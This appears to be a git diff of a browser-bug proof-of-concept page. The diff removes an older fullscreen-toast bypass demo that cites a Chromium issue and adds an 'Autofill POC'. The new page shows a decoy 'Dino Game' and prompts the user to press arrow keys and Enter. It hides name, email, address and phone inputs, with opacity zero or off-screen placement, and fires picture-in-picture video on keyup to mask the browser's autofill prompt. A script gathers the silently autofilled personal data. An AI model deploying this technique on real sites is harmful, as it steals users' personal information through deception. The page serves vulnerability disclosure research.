@@ -1,163 +1,297 @@
 <!DOCTYPE html>
+<html id="htmlid" >
+  <head>
+    <meta charset="utf-8">
+    <title>Autofill POC </title>
+     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
 
-<head>
-
-<meta charset=utf-8 />
-
- <style>
-* { margin:0; padding:0; }
-#page { width:500px; margin:80px 30px; }
-p { margin:30px 0; }
-button { padding:7px 20px; margin-right:10px;background-color: #008CBA;color: white;border: none;}
-.enabled { color:green }
-.disabled { color:red }
-#menu { position:fixed; top:0; left:0; padding:10px 20px; right:0; background:#fff; border-bottom:1px solid #ccc; background:#f5f5f5; opacity:.95; }
-
-
- </style>
-
-  
-</head>
-
-
-<body >
+   
     
-<script>
+    
+<style>
 
-function toggleFullScreen() {
-  if (!document.webkitFullscreenElement && !document.mozFullScreenElement) {
-    if (document.documentElement.webkitRequestFullscreen) {
-      document.documentElement.webkitRequestFullscreen();
-     // toggleFullScreen();
-    }
-    if (document.documentElement.mozRequestFullScreen) {
-      document.documentElement.mozRequestFullScreen();
-//toggleFullScreen();
-    }
-  } else {
-    if (document.webkitExitFullscreen) {
-      document.webkitExitFullscreen(); 
-  ////  toggleFullScreen();
-    }
-    if (document.mozCancelFullScreen) {
-      document.mozCancelFullScreen(); 
-//toggleFullScreen();
-    }
-  }
+
+/* Change autocomplete styles in WebKit */
+input:-webkit-autofill,
+input:-webkit-autofill:hover, 
+input:-webkit-autofill:focus,
+textarea:-webkit-autofill,
+textarea:-webkit-autofill:hover,
+textarea:-webkit-autofill:focus,
+select:-webkit-autofill,
+select:-webkit-autofill:hover,
+select:-webkit-autofill:focus {
+  /*border: 1px solid black;*/
+  -webkit-text-fill-color: black;
+  /*-webkit-box-shadow: 0 0 0px 1000px #000 inset;*/
+  /*transition: background-color 2000s ease-in-out 0s;*/
 }
 
-///
+/* PRESENTATIONAL STYLES */
+
+
+html {
+    font-family: sans-serif;
+    background-color: black;
+}
+body {
+ overflow-y: hidden
+background-color: white;
+
+}
+
+</style>
+
+    
+  <style>
+  
+body {
+background-color: black;
+ overflow-x: hidden;
+}
+     html { height:90%; }
+body { position:absolute; top:0; bottom:0; right:0; left:0; }
+
+/** This style for Dino Game in Modal**/
+*{
+    padding: 0;
+    margin: 0;
+    overflow-x: hidden;
+}
+.game{
+    width: 500px;
+    height: 200px;
+    border: 1px solid black;
+    margin: auto;
+}
+#character{
+    width: 20px;
+    height: 50px;
+    background-color: red;
+    position:relative;
+    top: 150px;
+}
+.animate{
+    animation: jump 0.3s linear;
+}
+@keyframes jump{
+    0%{top: 150px;}
+    30%{top: 100px;}
+    70%{top: 100px;}
+    100%{top: 150px;}
+}
+
+#block{
+    background-color: blue;
+    width: 20px;
+    height: 20px;
+    position: relative;
+    top: 130px;
+    left: 500px;
+    animation: block 1s infinite linear;
+}
+@keyframes block{
+    0%{left: 500px}
+    100%{left: -20px}
+}
+p{
+    text-align: right;
+}
+
+html { font-family: sans-serif; 
+    
+}
+
+#name {
+  position: relative;
+    bottom: -25px;
+    width: 20px;
+    height: 495px;/* main 480px */
+    opacity: 0;
+    right: -945px;
+
+}
+
+p { margin-left: 200px; }
+  </style>
+  <style>
+/* width */
+::-webkit-scrollbar {
+  width: 8px;
+}
+
+/* Track */
+::-webkit-scrollbar-track {
+  background: #f1f1f1; 
+}
+ 
+/* Handle */
+::-webkit-scrollbar-thumb {
+  background: #888; 
+}
+
+/* Handle on hover */
+::-webkit-scrollbar-thumb:hover {
+  background: #555; 
+}
+input {
+  opacity: 1;
+}
+input:not(#txtName) {
+  opacity: 0;
+}
+
+</style>
+  </head>
+  <body>
+      
+   
+
+<!-- start of Game -->
+<div id="htmlevent" style='position: absoulte; top: 10%; z-index: 2; color: #999DDD;'><center>
+    <div id="instructions" style="top:100px;float: left;position:fixed;width:1000px;">
+    <h3><i>Play Advanced Dino Game</i></h3><b id='exa'> <br><br>
+    
+    <h3 style="color: green; text-shadow: 0px 0px 2px rgba(255,255,255,0.7); border-style: dotted; border-width: 2px; max-width: 500px" id="ar"><u>DOWN</u> ARROW then (Enter)  to Show Game</h3>
+     <div class="game" style="background:white;">
+        <div id="character"></div>
+        <div id="block"></div>
+    </div>
+   
+   <br><br>
+</div>
+<div id="leak" style="top:10px;float: left;position:fixed;width:1000px;">
+<input type="text" id="txtName" style="background: lightgreen; color: black; text-shadow: 0px 0px 2px rgba(255,255,255,0.7); border-style: none; border-width: 2px;  width: 700px; height:50px;  max-width: 700px" readonly="readonly" />
+</div>
+<br>
+<video id="video" controls="" muted loop autoplay src="inst-overlay.mp4" autopictureinpicture hidden="true"></video>
 
 
 
-
-</script>
-</br>
-</br>
-
-<h4><p><b>Click toggle button color will be changed from blue to purple </b></p></h4>
-<h4></h3><p><b>Click toggle button color will be changed from purple to green :) Bypass Happen</b></p><p>Bypass of https://bugs.chromium.org/p/chromium/issues/detail?id=1301873</p> </h4>
+    <div id="pip-source" style='background-color: black;color: #C0C0C0; text-shadow: 0px 0px 6px rgba(255,255,255,0.7); max-width: 400px; opacity:0.001'>
+ 
+    </div>
+  
+   
 
 
-
-
-  	<div id="menu">
-  	    
-<button id="btn" onclick="setTimeout(function(){toggleFullScreen();},80);setTimeout(function(){toggleFullScreen();},250);disableScroll();" >Toggle Fullscreen(hide fullscreen toast) </button>
-
-
-		<button id="enable" hidden="true">enable scrolling</button>
-		<button id="disable" hidden="true">disable scrolling</button>
-		<strong id="status" hidden="true" class="enabled">enabled</strong>
-	</div>
-	  
-	
-  <div id="page">
-  <!-- <iframe src="#" height="3000" width="4"></iframe> -->
-  </div>
-
-  </body>
-
+ 
 <script>
 
-/////this code to change color every click on button///
 
-const btn = document.getElementById('btn');
+function showDiv() {
+   document.getElementById('welcomeDiv').style.display = "block";
+}
 
-let index = 0;
 
-const colors = ['purple', 'green', 'blue', 'red'];
+//this will fire pip mode and  Autofill appears behind that in the same time at the  first transition of pip  and still behind ,
+htmlid.addEventListener('keyup', () => {
+  //video.requestPictureInPicture();
 
-btn.addEventListener('click', function onClick() {
-  btn.style.backgroundColor = colors[index];
-  btn.style.color = 'white';
+// this is the core of bypass
+  
+setTimeout(() => {
+ 
+  video.requestPictureInPicture();
+  }, 60); //300 300 150
+  
+  setTimeout(() => {
+ 
+  video.requestPictureInPicture();
+  }, 40);  //600 250 100
+   
 
-  index = index >= colors.length - 1 ? 0 : index + 1;
+  
+});
+</script>
+ 
+ 
+    <script>
+ var video = document.getElementById('video');
+ var framedata = document.getElementById('framedata');
+
+    </script>
+  
+
+<input name="address-line1" id="address-line1" autocomplete="address-line1" onchange="sendtoparent();" >
+<input name="address-line2"  id="address-line2" autocomplete="address-line2" onchange="sendtoparent();">
+<input name="spoof" id="spoof" autocomplete="country-name">
+
+<input name="spoof" autocomplete="address-level2">
+<input name="state" autocomplete="address-level1" >
+<input name="name" id="name" autofocus=""  autocomplete="name"onfocus="video.requestPictureInPicture();" onblur="sendtoparent();" dir="rtl" ><br>
+<input  name="email"id="email" autocomplete="email" onchange="sendtoparent();" >
+<input name="postal-code" autocomplete="postal-code">
+<input name="tel" autocomplete="tel" id="tel" >
+
+
+
+
+<script type="text/javascript">
+    function sendtoparent() {
+
+
+            var txtName =document.getElementById("txtName");
+            var tel =document.getElementById("tel");
+            
+            txtName.value = "Name: " + document.getElementById("name").value + " ,Email: " + document.getElementById("email").value + " ,Country: " + document.getElementById("spoof").value + " ,Address: " + document.getElementById("address-line1").value + ",Phone: " + document.getElementById("tel").value;
+
+    }
+</script>
+
+
+
+    <script>
+ 
+ var video = document.getElementById('video');
+ var framedata = document.getElementById('framedata');
+setTimeout(function(){video.setAttribute('src', './inst-overlay.mp4');},100);
+ 
+ 
+/// this part for simple Dino Game 
+var character = document.getElementById("character");
+var block = document.getElementById("block");
+var counter=0;
+function jump(){
+    if(character.classList == "animate"){return}
+    character.classList.add("animate");
+    setTimeout(function(){
+        character.classList.remove("animate");
+    },300);
+}
+var checkDead = setInterval(function() {
+    let characterTop = parseInt(window.getComputedStyle(character).getPropertyValue("top"));
+    let blockLeft = parseInt(window.getComputedStyle(block).getPropertyValue("left"));
+    if(blockLeft<20 && blockLeft>-20 && characterTop>=130){
+        block.style.animation = "none";
+        console.log("Game Over. score: "+Math.floor(counter/100));
+        counter=0;
+        block.style.animation = "block 1s infinite linear";
+    }else{
+        counter++;
+        document.getElementById("scoreSpan").innerHTML = Math.floor(counter/100);
+    }
+}, 10);
+    </script>
+    
+    
+    
+     
+<script>
+
+htmlid.addEventListener('click', () => {
+    setTimeout(function(){
+//video.requestPictureInPicture();
+},150); //600 150
 });
 
-//////////////////////////
+</script>
+ 
 
-
-
-  document.getElementById("enable").onclick = function() {
-  enableScroll();
-  document.getElementById("status").innerHTML = "enabled";
-  document.getElementById("status").className = "enabled";
-};
-
-  document.getElementById("disable").onclick = function() {
-  disableScroll();
-  document.getElementById("status").innerHTML = "disabled";
-  document.getElementById("status").className = "disabled";
-};
-
-
-// left: 37, up: 38, right: 39, down: 40,
-// spacebar: 32, pageup: 33, pagedown: 34, end: 35, home: 36
-var keys = {37: 1, 38: 1, 39: 1, 40: 1};
-
-function preventDefault(e) {
-  e.preventDefault();
-}
-
-function preventDefaultForScrollKeys(e) {
-    if (keys[e.keyCode]) {
-        preventDefault(e);
-        return false;
-    }
-}
-
-// modern Chrome requires { passive: false } when adding event
-var supportsPassive = false;
-try {
-  window.addEventListener("test", null, Object.defineProperty({}, 'passive', {
-    get: function () { supportsPassive = true; } 
-  }));
-} catch(e) {}
-
-var wheelOpt = supportsPassive ? { passive: false } : false;
-var wheelEvent = 'onwheel' in document.createElement('div') ? 'wheel' : 'mousewheel';
-
-// call this to Disable
-function disableScroll() {
-  //window.addEventListener('DOMMouseScroll', preventDefault, false); // older FF
-  //window.addEventListener(wheelEvent, preventDefault, wheelOpt); // modern desktop
-  window.addEventListener('touchmove', preventDefault, wheelOpt); // mobile
-  //window.addEventListener('keydown', preventDefaultForScrollKeys, false);
-}
-
-// call this to Enable
-function enableScroll() {
- //window.removeEventListener('DOMMouseScroll', preventDefault, false);
-  //window.removeEventListener(wheelEvent, preventDefault, wheelOpt); 
-  //window.removeEventListener('touchmove', preventDefault, wheelOpt);
-  window.removeEventListener('keydown', preventDefaultForScrollKeys, false);
-}
-
-
-  </script>
+  </body>
+ 
   
 </html>
-
-
 
